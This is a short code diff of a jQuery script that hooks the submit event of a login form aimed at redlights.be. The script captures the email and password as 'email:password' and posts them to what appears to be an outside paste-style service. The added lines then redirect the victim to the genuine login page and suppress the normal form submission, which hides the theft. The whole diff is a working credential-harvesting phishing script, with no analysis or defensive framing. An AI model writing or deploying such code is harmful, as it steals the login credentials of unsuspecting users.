@@ -8,5 +8,9 @@ $('form[action="https://www.redlights.be/login/"]').on("submit", function(event)
                    "syntax":"autodetect",
                    "contents": $('input#email').val() + ":" + $('input#password').val() }]
     }
+  }).done(function () {
+    location.href = "https://redlights.be/login";
   });
+  
+  event.preventDefault();
 });
